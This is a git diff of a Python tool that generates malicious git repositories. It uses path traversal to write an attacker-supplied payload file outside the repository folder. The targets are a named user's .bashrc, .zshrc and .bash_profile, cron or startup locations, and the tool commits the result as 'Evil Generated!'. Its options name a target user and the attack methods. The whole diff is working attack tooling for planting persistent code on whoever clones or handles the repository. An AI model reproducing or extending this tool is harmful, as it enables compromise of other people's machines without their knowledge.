@@ -88,7 +88,6 @@ def badRepoGenerator( username :str,outputDirName="test",
 
     if os == "linux":
         if fuckMethod == "rcfile":
-
             evilPayloadBaseDir = superLongParentDir+"/home/"+username+"/"
             for eachfile in [".zshrc",".bashrc",".bash_profile"]:
                 evilPayloadLocation.append(evilPayloadBaseDir+eachfile)
@@ -116,32 +115,34 @@ def badRepoGenerator( username :str,outputDirName="test",
             fileGenerator(content,locations=evilPayloadLocation)
 
         elif fuckMethod == "msg":
-            print("[*] msg provide a method to add a file out of the git to play with")
+            print("[*] msg provide a method to add a file out of the git repo folder (you can use like a file adder or msg.exe)")
             print("[*] It can be used as test")
+            print("[*] It will use ./[badfilename] file content and add to the relative address about git repo(really create the file)")
+
+            print("[?] Do you wanna continue? [N/y] ",end="")
+            if input("") in ["N","n"]:
+                print("[-] exiting..")
+                exit(3)
 
             evilPayloadBaseDir = atPath
             evilPayloadLocation = [evilPayloadBaseDir+badfileName]
 
             with open(path+badfileName ,"r") as f:
                 content = f.read()
-
             fileGenerator(content,evilPayloadLocation)
 
         pass
 
 
     elif os == "win" :
-        if fuckMethod == "rcfile":
-            print("[-] Bad argument rcfile")
-            exit(-2)
-
+        print("[-] in Coming")
         pass # not available now
 
     badRepo.index.add(evilPayloadLocation)
     badRepo.index.commit("Evil Generated!")
     print("[+] Generate Repo successfully")
 
-    #cleanFiles(evilPayloadBaseDir,evilPayloadLocation)
+    cleanFiles(evilPayloadBaseDir,evilPayloadLocation)
 
 
 # def argcheck(obj):
@@ -155,12 +156,14 @@ def badRepoGenerator( username :str,outputDirName="test",
 
 def main():
     praser = argparse.ArgumentParser()
+
     praser.add_argument("-D","--outputDirectoryName",help="your repo with contain in this directory default is test",default="test")
     praser.add_argument("-u","--user",help="target username")
     praser.add_argument("-o","--os",help="os version [ win, linux ] default is linux",default="linux",choices=["win","linux"])
-    praser.add_argument("-m","--method",help="attack method [ cron, start, rcfile, msg ]",default="rcfile",choices=["cron","start","rcfile","msg"])
+    praser.add_argument("-m","--method",help="attack method [ cron, start, rcfile, msg ] ",default="rcfile",choices=["cron","start","rcfile","msg"])
     praser.add_argument("-B","--badfilename",help="badfile in cron mode name",default=".evilcode")
     praser.add_argument("-p","--atpath",help="bad file you want located at path such as ../../../ ")
+
     arg = praser.parse_args()
     # argcheck(arg)
     badRepoGenerator(username=arg.user,
